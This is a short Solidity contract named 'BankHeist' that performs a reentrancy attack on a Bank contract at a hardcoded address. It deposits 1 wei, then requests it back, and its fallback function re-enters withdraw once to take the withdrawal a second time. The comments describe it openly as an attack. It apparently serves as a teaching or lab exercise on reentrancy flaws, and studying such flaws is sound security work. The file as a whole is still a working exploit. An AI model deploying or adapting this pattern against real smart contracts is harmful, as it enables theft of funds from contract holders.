pragma solidity >=0.5.8;
import "./Bank.sol";
contract BankHeist {
    uint onlyonce = 0;
	// Set address of bank to be attacked.
	Bank public bank = Bank(0xF5F64C308eE73da717793053f23fed161AF724C6);
	// Send at least 1 wei as part of this call to deposit in the bank.
	function callFirst() public payable { bank.deposit.value(1)(); }
	// Starts reentrancy attack by requesting 1 wei back from the bank.
	function callSecond() public { bank.withdraw(1); }
	// Will request a second withdrawal of 1 wei from the bank.
	function () external payable {
	    if(onlyonce == 0){ onlyonce = onlyonce + 1; bank.withdraw(1); }
	}
}